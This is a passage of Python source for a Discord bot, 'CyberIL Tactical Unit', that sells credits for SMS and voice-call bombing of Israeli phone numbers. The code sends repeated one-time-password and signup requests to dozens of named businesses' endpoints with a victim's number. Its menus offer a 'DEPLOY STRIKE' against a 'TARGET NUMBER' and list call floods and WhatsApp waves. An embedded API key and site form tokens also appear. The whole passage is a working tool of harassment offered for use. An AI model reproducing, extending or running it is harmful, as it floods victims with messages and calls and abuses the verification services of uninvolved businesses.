"0cAFcWeA5PbEgcsunaaEtl6NGj42rsCw_j-mRZXXcpIwHiMkRv8_z5ALroAy4nrB5H0d9_3EmAT5lir9rdEUmYgJcljVuwkmXejS2XpA8D-SslaqIGDAxdoPpt8avI4LEirhzVHZS84ELsjkcSVnE9MHDQf4uGnuT99SpOJqr5vrQ8eamoK2JopgSoYOeSJ-jxvTkahhmphpEWQM6hqtF0MU80L7zXTCiBd0pizXHWf904G_emSIqIrmaU5bgE9EM6gH3Zj8hcVmI-7L-eQ0vRdQioD_TAC4WhCJ4GRwhKqNIM3VVh3OoT8I24BqoT1VPptonhRje1XR7g1gB_vRbQieoXLXkHq8oCX5PgC9AtSbHwD88F7bfyNRlt5n44OPa5UnBnIx58aJlDk5sRXqV9EHpJOVMg08S4M4FzIDbYEKOPHHrnfWujAdjNsHfkmjezSFcfk4IAAgjCTfkXlxhGZ6lKKoJzbX7p3n1NcmtJ2M9W3nU01-J3w6e4PmR3gDXTp2LvkBQPUf2V-ZeHaQZYMAZDKnkgbLDrgmUofR232uXigH8MDrKyctqUeXJdApEFZnPg4OGvSXXCNx5qmDRnjsgf_S-nFOBJhyAXqh2H-1i8d5lHD0NO-fXB9gj_bPd5g9Dy9fBG96bsYrAnpzOGDoETucSkhY9nh9ZR7eS5efKUTf_UD-Ml6sYdEmdaL-vj90IZFwHKTf51n5XJ7DpU9gSO-TlOH4_RoGFdbO4Cbyf1QgPuJe1oRVl4XCnad4EEyO1WRL5D33Rg-SLWzDMHUrjzKYVcX6TJyledkhCyaVpiG5-Jtc4P2ER1Vd9qhZoXTmyY8Qhxku8fpiur6Kgn7vJhz21gmFfytzHwQyFxMNtYKGGy9i3f_vrcVZtAn-Hl9AOLh825jWS3dGIou4zIaAoWxIyHTPF1YewbwXXLxguzD1b0OdLN-4H2aaGG5-4xj4Kpj0ObbCJSXNYrkRZ6lXS--aOoHreDg4rMN8os-_lyKHQvxvQbNAbC3u9xf73X_zpNPU6riKHRIVDnZvUMdpm_fPtnc3w6Vc5aTMJJPmP-axLkT4g0hd9j8RaCkXKMSaszT60elGULw-t-oA79BkTi2x5xuStGScG_35Kk9kP6B7mvtuDmhqQe1c5vabCuj_ueyWod8LXeEpX5wPOKjyDNVhjSS4IJt_LDLl1ecc4seD6s9yC1INKUQFIe52J37ekfrh2rLSqw1ERZ2Vl_YziFDTE4OHpAh1Y3rOI4jqXaYyRVnt4PvNBjkYuPcImXrQxB-yM6AHA_5QzZByozp2ZD39zVPzC6uATt72ZLXnoxNE6Bxa0QkOElaIuSkHv0JiL4VPzjPgE4J3cTK9zESKE7M7KO89NUToDVJ6vrT06MnY12nZJtYjtgLoba0nqVl1512nIHV12bK3MZpbOzrl2hNoEMbUM-KZsyMlnoQZHy2_n8I3YZwgTMTD2Os6YGSG4IViPy2xZ-jf70bmBaT48XgW0JDPKIGXSMZYY9SEIn4FnbvE0iageIOaRA8GI8urP5Gm345SPFFlTJHOPFYZncz8wmbFOb6Sj2lhO0PBT6rWMpmEpjpSFatJkCRxocQVrcTLZx8nrgvmoGDieH_RG--juXCrwmcAiX0hN56lKOFpoh0RUX6mQTPY1X1O7M05l7iYpy3D_l_KcxgpDg61AdYuq_oFC_xdd99bVScV-2YcxAIkx4ggpU7IuLOHtvoPn-bftPxaOSI3gepj0TbIioHZ4dvSI3-RgGHRWVmb7GRntKT7r5VqT10frTJEa9ZtIyrH2QfRBWB0SaSBZ7pjEtmK1hoBouEdimg8JyTnSfq64DtJZnStDTWEdC6dpqOXbeI3fgV6angRqH9dJxY_Mgjo1Rj7Oo_xr2UadXo3kLj_p3CLfG8ryBcZnK0OtHm-w0EzdS6ouaNdfQZ6a0BcYPlCli605PEf3C2Ef-LCCYGIQjZ4hdvkXHE5YSyroCzUUNtI9HRLWsIildw9LUHz4G4U5fLlilCQq0L2W3VS-0OBrpJU2e17wRL3802ILYquN2KRrbtQz0-IllIPPEqX52EF5lBV7L1dnguGK5Lr1417W9l9mdhnUkAuE_T9dQ7_mucqcgFu3EZCAkMWEb6cuae4SELDtLQ1ch_CFQR1oGpe8wLnsyEwboyoe-nr2nfwLnuC7sc5ugnliWgc6GLMlVQQEbrLKGD9tQS98nT-LKVUrqyQkcmFE", "phone": "0504414408", "sendCodeBy": "CALL", "step": "SendValidPhone", "token": "menualWS_ymta", "uniqCustomerId": "68058a89-fedd-4409-8725-f989652d8305"},
                extra_headers={"origin": "https://www.call2all.co.il", "referer": "https://www.call2all.co.il/", "accept-encoding": "gzip, deflate"},
                tag="call2all"),
            http_post(session, "POST", "https://rest-api.dibs-app.com/otps",
                json_data={"phoneNumber": formatted},
                extra_headers=json_headers("https://dibs-app.com", "https://dibs-app.com/", {"sec-fetch-site": "same-site"}),
                tag="dibs"),
            http_post(session, "POST", "https://www.nine-west.co.il/customer/ajax/post/",
                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.nine-west.co.il", "https://www.nine-west.co.il/"),
                tag="ninewest"),
            http_post(session, "POST", "https://www.leecooper.co.il/customer/ajax/post/",
                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.leecooper.co.il", "https://www.leecooper.co.il/"),
                tag="leecooper"),
            http_post(session, "POST", "https://www.kikocosmetics.co.il/customer/ajax/post/",
                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.kikocosmetics.co.il", "https://www.kikocosmetics.co.il/"),
                tag="kiko"),
            http_post(session, "POST", "https://www.topten-fashion.com/customer/ajax/post/",
                form=f"form_key=soiphrLs3vM2A1Ta&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.topten-fashion.com", "https://www.topten-fashion.com/"),
                tag="topten"),
            http_post(session, "POST", "https://www.lehamim.co.il/_a/aff_otp_auth",
                form=f"phone={raw}",
                extra_headers={**form_headers("https://www.lehamim.co.il", "https://www.lehamim.co.il/"), "sec-fetch-site": "same-origin"},
                tag="lehamim"),
            http_post(session, "POST", "https://www.555.co.il/ms/rest/otpservice/client/send/phone?contentContext=3&returnTo=/pearl/apps/vehicle-policy?insuranceTypeId=1",
                json_data={"password": None, "phoneNr": raw, "sendType": 1, "systemType": None},
                extra_headers=json_headers("https://www.555.co.il", "https://www.555.co.il/", {"sec-fetch-site": "same-origin"}),
                tag="555"),
            http_post(session, "POST", "https://www.jungle-club.co.il/wp-admin/admin-ajax.php",
                form=f"action=simply-check-member-cellphone&cellphone={raw}",
                extra_headers=form_headers("https://www.jungle-club.co.il", "https://www.jungle-club.co.il/"),
                tag="jungleclub"),
            http_post(session, "POST", "https://blendo.co.il/wp-admin/admin-ajax.php",
                form=f"action=simply-check-member-cellphone&cellphone={raw}",
                extra_headers=form_headers("https://blendo.co.il", "https://blendo.co.il/"),
                tag="blendo"),
            http_post(session, "POST", "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
                json_data={"phoneNumber": raw, "sourceFrom": "AuthJS", "isCalling": True},
                extra_headers=json_headers("https://mishloha.co.il", "https://mishloha.co.il/", {"sec-fetch-site": "same-site"}),
                tag="mishloha"),
            http_post(session, "POST", "https://we.care.co.il/wp-admin/admin-ajax.php",
                form=(f"post_id=351178&form_id=7079d8dd&referer_title=Care&queried_id=351178&form_fields[name]=CyberIL&form_fields[phone]={raw}&form_fields[email]={random_email}&form_fields[accept]=on&action=elementor_pro_forms_send_form&referrer=https://we.care.co.il/"),
                extra_headers=form_headers("https://we.care.co.il", "https://we.care.co.il/glasses-tor/"),
                tag="wecare"),
            http_post(session, "POST", "https://www.matara.pro/nedarimplus/V6/Files/WebServices/DebitBit.aspx?Action=CreateTransaction",
                form=f"MosadId=7000297&ClientName=CyberIL&Phone={raw}&Amount=100&Tashlumim=1",
                extra_headers={"Content-Type": FORM_TYPE, "accept-encoding": "gzip, deflate", "referer": "https://www.matara.pro/", "origin": "https://www.matara.pro"},
                tag="matara"),
            http_post(session, "POST", "https://wissotzky-tlab.co.il/wp/wp-admin/admin-ajax.php",
                form=(f"action=otp_register&otp_phone={raw}&first_name=Cyber&last_name=IL&email={random_email}&date_birth=2000-11-11&approve_terms=true&approve_marketing=true"),
                extra_headers=form_headers("https://wissotzky-tlab.co.il", "https://wissotzky-tlab.co.il/"),
                tag="wissotzky"),
            http_post(session, "POST", "https://clocklb.ok2go.co.il/api/v2/users/login",
                json_data={"phone": raw},
                extra_headers=json_headers("https://clocklb.ok2go.co.il", "https://clocklb.ok2go.co.il/", {"sec-fetch-site": "same-origin"}),
                tag="ok2go"),
            http_post(session, "POST", "https://api-endpoints.histadrut.org.il/signup/send_code",
                json_data={"phone": raw},
                extra_headers={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "origin": "https://signup.histadrut.org.il", "referer": "https://signup.histadrut.org.il/", "x-api-key": "480317067f32f2fd3de682472403468da507b8d023a531602274d17d727a9189", "sec-fetch-site": "same-site"},
                tag="histadrut"),
            http_post(session, "POST", "https://www.papajohns.co.il/_a/aff_otp_auth",
                form=f"phone={raw}",
                extra_headers={**form_headers("https://www.papajohns.co.il", "https://www.papajohns.co.il/"), "sec-fetch-site": "same-origin"},
                tag="papajohns"),
            http_post(session, "POST", "https://www.iburgerim.co.il/_a/aff_otp_auth",
                form=f"phone={raw}",
                extra_headers={**form_headers("https://www.iburgerim.co.il", "https://www.iburgerim.co.il/"), "sec-fetch-site": "same-origin"},
                tag="iburgerim"),
            http_post(session, "GET", f"https://www.americanlaser.co.il/wp-json/calc/v1/send-sms?phone={raw}",
                extra_headers={"referer": "https://www.americanlaser.co.il/calc/", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "accept-encoding": "gzip, deflate"},
                tag="americanlaser"),
            http_post(session, "POST", f"https://wb0lovv2z8.execute-api.eu-west-1.amazonaws.com/prod/api/v1/getOrdersSiteData?otpPhone={raw}",
                json_data={"id": session_id, "domain": "5fc39fabffae5ac5a229cebb", "action": "generateOneTimer", "phoneNumber": raw},
                extra_headers=json_headers("https://orders.beecommcloud.com", "https://orders.beecommcloud.com/", {"sec-fetch-site": "cross-site"}),
                tag="beecomm"),
            http_post(session, "POST", "https://xtra.co.il/apps/api/inforu/sms",
                json_data={"phoneNumber": raw},
                extra_headers={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "origin": "https://xtra.co.il", "referer": "https://xtra.co.il/pages/brand/cafe-cafe", "sec-fetch-site": "same-origin"},
                tag="xtra"),
            http_post(session, "POST", "https://www.lighting.co.il/customer/ajax/post/",
                form=f"form_key=OoHXm6oGzca2WeJR&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.lighting.co.il", "https://www.lighting.co.il/"),
                tag="lighting"),
            http_post(session, "POST", "https://proxy1.citycar.co.il/api/verify/login",
                json_data={"phoneNumber": formatted, "verifyChannel": 2, "loginOrRegister": 1},
                extra_headers=json_headers("https://citycar.co.il", "https://citycar.co.il/", {"sec-fetch-site": "same-site"}),
                tag="citycar"),
            http_post(session, "POST", "https://www.lilit.co.il/customer/ajax/post/",
                form=f"form_key=sXWXnRwFsKy5YX9E&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.lilit.co.il", "https://www.lilit.co.il/"),
                tag="lilit"),
            http_post(session, "POST", "https://www.castro.com/customer/ajax/post/",
                form=f"bot_validation=1&type=login&telephone={raw}",
                extra_headers=form_headers("https://www.castro.com", "https://www.castro.com/"),
                tag="castro"),
            http_post(session, "POST", "https://www.bathandbodyworks.co.il/customer/ajax/post/",
                form=f"form_key=ckGbaafzIC4Yi2l8&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.bathandbodyworks.co.il", "https://www.bathandbodyworks.co.il/home"),
                tag="bathandbody"),
            http_post(session, "POST", "https://www.golbary.co.il/customer/ajax/post/",
                form=f"form_key=w1deINjU3Ffpj8ct&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.golbary.co.il", "https://www.golbary.co.il/"),
                tag="golbary"),
            http_post(session, "POST", "https://api.getpackage.com/v1/graphql/",
                json_data={"operationName": "sendCheckoutRegistrationCode", "variables": {"userName": raw}, "query": "mutation sendCheckoutRegistrationCode($userName: String!) { sendCheckoutRegistrationCode(userName: $userName) { status __typename } }"},
                extra_headers=json_headers("https://www.getpackage.com", "https://www.getpackage.com/", {"sec-fetch-site": "same-site"}),
                tag="getpackage"),
            http_post(session, "POST", "https://ohmama.co.il/?wc-ajax=validate_user_by_sms",
                form=f"otp_login_nonce=de90e8f67b&phone={raw}&security=de90e8f67b",
                extra_headers={**form_headers("https://ohmama.co.il", "https://ohmama.co.il/"), "sec-fetch-site": "same-origin"},
                tag="ohmama"),
            http_post(session, "POST", "https://server.myofer.co.il/api/sendAuthSms",
                json_data={"phoneNumber": raw},
                extra_headers=json_headers("https://www.myofer.co.il", "https://www.myofer.co.il/", {"sec-fetch-site": "same-site", "x-app-version": "3.0.0"}),
                tag="myofer"),
            http_post(session, "POST", "https://arcaffe.co.il/wp-admin/admin-ajax.php",
                form=f"action=user_login_step_1&phone_number={raw}&step[]=1",
                extra_headers=form_headers("https://arcaffe.co.il", "https://arcaffe.co.il/"),
                tag="arcaffe"),
            http_post(session, "POST", "https://api.noyhasade.co.il/api/login?origin=web",
                json_data={"phone": raw, "email": False, "ip": "1.1.1.1"},
                extra_headers=json_headers("https://www.noyhasade.co.il", "https://www.noyhasade.co.il/", {"sec-fetch-site": "same-site"}),
                tag="noyhasade"),
        ] + atmos_club

        all_results = await asyncio.gather(*missions, return_exceptions=True)
        success_count = 0
        failure_list = []
        
        for res in all_results:
            if isinstance(res, Exception):
                continue
            elif isinstance(res, tuple):
                if len(res) == 3:
                    ok, name, reason = res
                    if ok:
                        success_count += 1
                    else:
                        failure_list.append(f"{name} ({reason})")
                else:
                    ok, name = res
                    if ok:
                        success_count += 1
                    else:
                        failure_list.append(name)

        for res in atmos_results:
            if isinstance(res, Exception):
                continue
            elif isinstance(res, tuple):
                if len(res) == 3:
                    ok, name, reason = res
                    if ok:
                        success_count += 1
                    else:
                        failure_list.append(f"{name} ({reason})")
                else:
                    ok, name = res
                    if ok:
                        success_count += 1
                    else:
                        failure_list.append(name)

        return success_count, failure_list

def create_dashboard():
    embed = discord.Embed(
        title="🛡️ CYBERIL TACTICAL UNIT | COMMAND CENTER",
        color=COLOR_MAIN,
        description=(
            f"┌─────────────────────────────────┐\n"
            f"│   WELCOME TO THE OPERATIONS    │\n"
            f"│   HUB                          │\n"
            f"└─────────────────────────────────┘\n\n"
            f"📡 **ACTIVE PROTOCOLS:**\n"
            f"├─ 📱 SMS MASS DISTRIBUTION\n"
            f"├─ 📞 VOICE CALL FLOOD\n"
            f"└─ 💬 WHATSAPP WAVE\n\n"
            f"⚡ **SYSTEM STATUS:** ONLINE\n"
            f"🛡️ **SECURITY LEVEL:** MAXIMUM\n"
            f"🎯 **TARGET CAPACITY:** UNLIMITED\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📖 **DOCUMENTATION:** <#{INFO_CHANNEL}>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
    )
    embed.add_field(name="🎯 DEPLOY STRIKE", value="`SMS` • `CALLS` • `WHATSAPP`\n*Credit consumption per operation*", inline=False)
    embed.add_field(name="📊 ASSET BALANCE", value="Click to view your resources", inline=True)
    embed.add_field(name="💸 ACQUIRE CREDITS", value=f"[PURCHASE PORTAL]({STORE_URL})", inline=True)
    embed.set_footer(text="CyberIL Systems • Encrypted Channel • 2026", icon_url="https://i.imgur.com/6X8o7qL.png")
    return embed

class StopMission(discord.ui.View):
    def __init__(self, user_id):
        super().__init__(timeout=600)
        self.user_id = user_id

    @discord.ui.button(label="🛑 ABORT MISSION", style=discord.ButtonStyle.danger)
    async def abort_mission(self, interaction, button):
        if interaction.user.id != self.user_id and not is_authorized(interaction):
            await interaction.response.send_message("❌ Unauthorized access.", ephemeral=True)
            return
        event = active_missions.get(self.user_id)
        if event:
            event.set()
        button.disabled = True
        await interaction.response.edit_message(view=self)

class ConfirmStrike(discord.ui.View):
    def __init__(self, phone, total_rounds, cost, user_id):
        super().__init__(timeout=30)
        self.phone = phone
        self.total_rounds = total_rounds
        self.cost = cost
        self.user_id = user_id

    @discord.ui.button(label="✅ CONFIRM STRIKE", style=discord.ButtonStyle.danger)
    async def confirm_strike(self, interaction, button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ Authorization failed.", ephemeral=True)
            return
        self.stop()

        try:
            await interaction.response.defer()
        except Exception:
            return

        for _ in range(self.cost):
            if not await use_credit(self.user_id):
                await interaction.edit_original_response(embed=discord.Embed(title="❌ INSUFFICIENT CREDITS", color=COLOR_DANGER), view=None)
                return

        strike_event = asyncio.Event()
        active_missions[self.user_id] = strike_event

        progress = discord.Embed(title="⚡ STRIKE IN PROGRESS", description=f"Target: **{self.phone}**\nDuration: `~{self.cost * 35}s`", color=COLOR_WARNING)
        progress.set_footer(text="Click ABORT to terminate operation.")
        await interaction.edit_original_response(embed=progress, view=StopMission(self.user_id))

        total_success = 0
        total_failed = 0

        try:
            for _ in range(self.total_rounds):
                if strike_event.is_set():
                    break
                s, f = await execute_all(self.phone)
                total_success += s
                total_failed += f

            await apply_cooldown(self.phone)
            active_missions.pop(self.user_id, None)
            aborted = strike_event.is_set()

            await save_mission_log(
                user_id=self.user_id,
                username=str(interaction.user),
                phone=self.phone,
                cost=self.cost,
                success=total_success,
                failed=total_failed,
                duration=self.cost * 35
            )

            remaining = await format_balance(self.user_id)
            result = discord.Embed(title="🛑 MISSION ABORTED" if aborted else "✅ STRIKE COMPLETED", color=COLOR_INFO)
            result.add_field(name="🎯 TARGET", value=self.phone, inline=True)
            result.add_field(name="⏱️ DURATION", value=f"~{self.cost * 35}s", inline=True)
            result.add_field(name="✅ SUCCESS", value=str(total_success), inline=True)
            result.add_field(name="❌ FAILED", value=str(total_failed), inline=True)
            result.add_field(name="💰 REMAINING", value=remaining, inline=True)
            await interaction.edit_original_response(embed=result, view=None)

        except Exception as error:
            active_missions.pop(self.user_id, None)
            await interaction.edit_original_response(embed=discord.Embed(title="⚠️ SYSTEM ERROR", description=str(error)[:180], color=COLOR_DANGER), view=None)

    @discord.ui.button(label="❌ CANCEL", style=discord.ButtonStyle.secondary)
    async def cancel_strike(self, interaction, button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ Access denied.", ephemeral=True)
            return
        self.stop()
        await interaction.response.edit_message(embed=discord.Embed(title="❌ OPERATION CANCELLED", description="No resources were consumed.", color=COLOR_INFO), view=None)

class DeployModal(discord.ui.Modal, title="⚡ DEPLOY STRIKE PACKAGE"):
    phone_field = discord.ui.TextInput(label="TARGET NUMBER", placeholder="054XXXXXXX", min_length=10, max_length=10, style=discord.TextStyle.short)
    credits_field = discord.ui.TextInput(label="CREDITS TO DEPLOY (MAX 100)", placeholder="e.g., 5", min_length=1, max_length=3, style=discord.TextStyle.short)

    async def on_submit(self, interaction):
        phone = self.phone_field.value.strip()
        if not re.match(r"^05[0-9]{8}$", phone):
            await interaction.response.send_message("❌ INVALID FORMAT — Must be **05XXXXXXXX**", ephemeral=True)
            return

        try:
            credits = int(self.credits_field.value.strip())
            if credits < 1 or credits > MAX_CREDIT_SPEND:
                raise ValueError
        except ValueError:
            await interaction.response.send_message(f"❌ Value must be between 1–{MAX_CREDIT_SPEND}.", ephemeral=True)
            return

        user_id = interaction.user.id
        total_rounds = credits * CREDITS_PER_CYCLE

        balance = await fetch_balance(user_id)
        unlimited = await has_unlimited_access(user_id)

        if balance < credits and not unlimited:
            await interaction.response.send_message(f"❌ Required: **{credits}** credits | Available: **{balance}**", ephemeral=True)
            return

        on_cd, remaining = await check_cooldown(phone)
        if on_cd:
            await interaction.response.send_message(f"⏳ COOLDOWN ACTIVE — **{remaining}s** remaining.", ephemeral=True)
            return

        balance_text = await format_balance(user_id)
        confirm = discord.Embed(title="⚠️ CONFIRM DEPLOYMENT", description=f"```\nTARGET     : {phone}\nDURATION   : ~{credits * 35}s\nCOST       : {credits} credits\nBALANCE    : {balance_text}\n```", color=COLOR_WARNING)
        await interaction.response.send_message(embed=confirm, view=ConfirmStrike(phone=phone, total_rounds=total_rounds, cost=credits, user_id=user_id), ephemeral=True)

class CommandCenter(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(discord.ui.Button(label="💸 ACQUIRE CREDITS", style=discord.ButtonStyle.link, url=STORE_URL))

    @discord.ui.button(label="🎯 DEPLOY STRIKE", style=discord.ButtonStyle.danger, custom_id="deploy_strike")
    async def deploy_button(self, interaction, button):
        current = time.time()
        last = cooldown_tracker.get(interaction.user.id, 0)
        if current - last < LAUNCH_DELAY:
            remaining = int(LAUNCH_DELAY - (current - last))
            try:
                await interaction.response.send_message(f"⏳ COOLDOWN: **{remaining}s**", ephemeral=True)
            except discord.errors.NotFound:
                pass
            return
        cooldown_tracker[interaction.user.id] = current
        try:
            await interaction.response.send_modal(DeployModal())
        except discord.errors.NotFound:
            pass

    @discord.ui.button(label="📊 ASSET STATUS", style=discord.ButtonStyle.primary, custom_id="asset_status")
    async def status_button(self, interaction, button):
        user_id = interaction.user.id
        balance_text = await format_balance(user_id)
        stats = await get_user_stats(user_id)

        embed = discord.Embed(title="📊 ASSET STATUS REPORT", description=f"**{balance_text}** credits", color=COLOR_INFO)
        if stats:
            embed.add_field(name="🎯 DEPLOYMENTS", value=str(stats.get("total_missions", 0)), inline=True)
            embed.add_field(name="✅ SUCCESS RATE", value=str(stats.get("total_success", 0)), inline=True)
            embed.add_field(name="❌ FAILURES", value=str(stats.get("total_failed", 0)), inline=True)
            embed.add_field(name="💎 RESOURCES USED", value=str(stats.get("total_cost", 0)), inline=True)

        try:
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except discord.errors.NotFound:
            pass

class GiftSystem(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎁 CLAIM 5 CREDITS", style=discord.ButtonStyle.danger, custom_id="claim_gift")
    async def claim_gift(self, interaction, button):
        user_id = interaction.user.id
        now = time.time()
        try:
            await interaction.response.defer(ephemeral=True)
        except Exception:
            return

        record = await settings_collection.find_one({"_id": user_id, "type": "gift_claim"})
        if record:
            diff = now - record.get("last_claim", 0)
            if diff < 86400:
                hours = int((86400 - diff) // 3600)
                minutes = int(((86400 - diff) % 3600) // 60)
                cooldown_embed = discord.Embed(title="⏳ ALREADY CLAIMED", description=f"Next claim in **{hours}h {minutes}m**", color=COLOR_WARNING)
                await interaction.followup.send(embed=cooldown_embed, ephemeral=True)
                return

        await increase_balance(user_id, 5)
        await settings_collection.update_one({"_id": user_id, "type": "gift_claim"}, {"$set": {"last_claim": now}}, upsert=True)

        new_balance = await format_balance(user_id)
        success_embed = discord.Embed(title="🎁 +5 CREDITS", description=f"New balance: **{new_balance}** credits\nDaily reset in 24h.", color=COLOR_SUCCESS)
        await interaction.followup.send(embed=success_embed, ephemeral=True)

@client.event
async def on_ready():
    client.add_view(CommandCenter())
    client.add_view(GiftSystem())
    await tree.sync()
    print(f"✅ CyberIL Tactical Unit Online → {client.user}")
    print(f"📡 Connected to {len(client.guilds)} sectors")

    await asyncio.sleep(2)

    try:
        main_channel = client.get_channel(PANEL_CHANNEL)
        if main_channel:
            await main_channel.purge(limit=5)
            await main_channel.send(embed=create_dashboard(), view=CommandCenter())
            print(f"✅ Command center deployed to {main_channel.name}")
        else:
            print(f"❌ Channel not found: {PANEL_CHANNEL}")

        gift_channel = client.get_channel(GIFT_CHANNEL)
        if gift_channel:
            gift_embed = discord.Embed(title="🎁 DAILY RESUPPLY", description="All operatives receive **5 combat credits**\n\nRedeemable every **24 hours**.", color=0x000000)
            await gift_channel.purge(limit=5)
            await gift_channel.send(embed=gift_embed, view=GiftSystem())
            print(f"✅ Gift station deployed to {gift_channel.name}")
        else:
            print(f"❌ Channel not found: {GIFT_CHANNEL}")

    except Exception as error:
        print(f"Deployment error: {error}")

@tree.command(name="asset_status", description="Check current resource balance")
@app_commands.describe(member="Operative to inspect (leave empty for self)")
async def asset_status(interaction: discord.Interaction, member: discord.Member = None):
    target = member or interaction.user
    balance = await format_balance(target.id)
    stats = await get_user_stats(target.id)

    embed = discord.Embed(title="📊 ASSET STATUS", description=f"{target.mention} — **{balance}** credits", color=COLOR_INFO)
    if stats:
        embed.add_field(name="🎯 DEPLOYMENTS", value=str(stats.get("total_missions", 0)), inline=True)
        embed.add_field(name="✅ SUCCESS", value=str(stats.get("total_success", 0)), inline=True)
        embed.add_field(name="❌ FAILURES", value=str(stats.get("total_failed", 0)), inline=True)

    await interaction.response.send_message(embed=embed)

@tree.command(name="add_assets", description="[HIGH COMMAND] Credit allocation")
@app_commands.describe(member="Recipient", amount="Credit quantity")
async def add_assets(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_authorized(interaction):
        await interaction.response.send_message("❌ Clearance level insufficient.", ephemeral=True)
        return
    if amount <= 0:
        await interaction.response.send_message("❌ Positive value required.", ephemeral=True)
        return
    await increase_balance(member.id, amount)
    new_balance = await format_balance(member.id)
    embed = discord.Embed(title="✅ CREDITS ALLOCATED", color=COLOR_SUCCESS)
    embed.add_field(name="OPERATIVE", value=member.mention, inline=True)
    embed.add_field(name="AMOUNT", value=str(amount), inline=True)
    embed.add_field(name="NEW BALANCE", value=new_balance, inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="remove_assets", description="[HIGH COMMAND] Credit confiscation")
@app_commands.describe(member="Target", amount="Credit quantity")
async def remove_assets(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_authorized(interaction):
        await interaction.response.send_message("❌ Authorization denied.", ephemeral=True)
        return
    if amount <= 0:
        await interaction.response.send_message("❌ Value must be positive.", ephemeral=True)
        return
    await decrease_balance(member.id, amount)
    new_balance = await format_balance(member.id)
    embed = discord.Embed(title="🗑️ CREDITS CONFISCATED", color=COLOR_WARNING)
    embed.add_field(name="OPERATIVE", value=member.mention, inline=True)
    embed.add_field(name="AMOUNT", value=str(amount), inline=True)
    embed.add_field(name="NEW BALANCE", value=new_balance, inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="grant_unlimited", description="[HIGH COMMAND] Activate unlimited resources")
@app_commands.describe(member="Recipient")
async def grant_unlimited(interaction: discord.Interaction, member: discord.Member):
    if not is_authorized(interaction):
        await interaction.response.send_message("❌ Insufficient clearance.", ephemeral=True)
        return
    await interaction.response.defer()
    await set_unlimited_status(member.id, True)
    embed = discord.Embed(title="♾️ UNLIMITED ACCESS GRANTED", description=f"{member.mention} now has unlimited resources.", color=COLOR_SUCCESS)
    await interaction.followup.send(embed=embed)

@tree.command(name="revoke_unlimited", description="[HIGH COMMAND] Revoke unlimited status")
@app_commands.describe(member="Target")
async def revoke_unlimited(interaction: discord.Interaction, member: discord.Member):
    if not is_authorized(interaction):
        await interaction.response.send_message("❌ Access restricted.", ephemeral=True)
        return
    await interaction.response.defer()
    await set_unlimited_status(member.id, False)
    embed = discord.Embed(title="♾️ UNLIMITED ACCESS REVOKED", description=f"{member.mention} resources now limited.", color=COLOR_WARNING)
    await interaction.followup.send(embed=embed)

@tree.command(name="distribute_gift", description="[HIGH COMMAND] Broadcast daily gift")
async def distribute_gift(interaction: discord.Interaction):
    if not is_authorized(interaction):
        await interaction.response.send_message("❌ Command requires admin clearance.", ephemeral=True)
        return
    embed = discord.Embed(title="🎁 DAILY RESUPPLY", description="All operatives receive **5 combat credits**\n\nRedeemable every **24 hours**.", color=0x000000)
    await interaction.response.send_message(embed=embed, view=GiftSystem())

@tree.command(name="global_allocation", description="[HIGH COMMAND] Universal credit distribution")
@app_commands.describe(amount="Credits per operative")
async def global_allocation(interaction: discord.Interaction, amount: int):
    if not is_authorized(interaction):
        await interaction.response.send_message("❌ Authorization failed.", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    if amount <= 0:
        await interaction.followup.send("❌ Positive value required.", ephemeral=True)
        return
    await users_collection.update_many({}, {"$inc": {"credits": amount}})
    await interaction.followup.send(f"✅ **{amount}** credits distributed to all operatives!", ephemeral=True)

@tree.command(name="inspect_operative", description="[HIGH COMMAND] Resource inspection")
@app_commands.describe(member="Operative to inspect")
async def inspect_operative(interaction: discord.Interaction, member: discord.Member):
    if not is_authorized(interaction):
        await interaction.response.send_message("❌ Access denied.", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    balance = await format_balance(member.id)
    stats = await get_user_stats(member.id)

    embed = discord.Embed(title="🔍 OPERATIVE DOSSIER", color=COLOR_INFO)
    embed.add_field(name="OPERATIVE", value=member.mention, inline=True)
    embed.add_field(name="ASSETS", value=f"**{balance}**", inline=True)
    if stats:
        embed.add_field(name="🎯 DEPLOYMENTS", value=str(stats.get("total_missions", 0)), inline=True)
        embed.add_field(name="✅ SUCCESS", value=str(stats.get("total_success", 0)), inline=True)
        embed.add_field(name="❌ FAILURES", value=str(stats.get("total_failed", 0)), inline=True)

    embed.set_footer(text=f"Requested by {interaction.user.name}")
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="transfer_assets", description="Transfer resources to another operative (min 20)")
@app_commands.describe(member="Recipient", amount="Credit amount (min 20)")
async def transfer_assets(interaction: discord.Interaction, member: discord.Member, amount: int):
    await interaction.response.defer(ephemeral=True)
    if amount < 20:
        await interaction.followup.send("❌ Minimum transfer: **20** credits.", ephemeral=True)
        return
    if interaction.user.id == member.id:
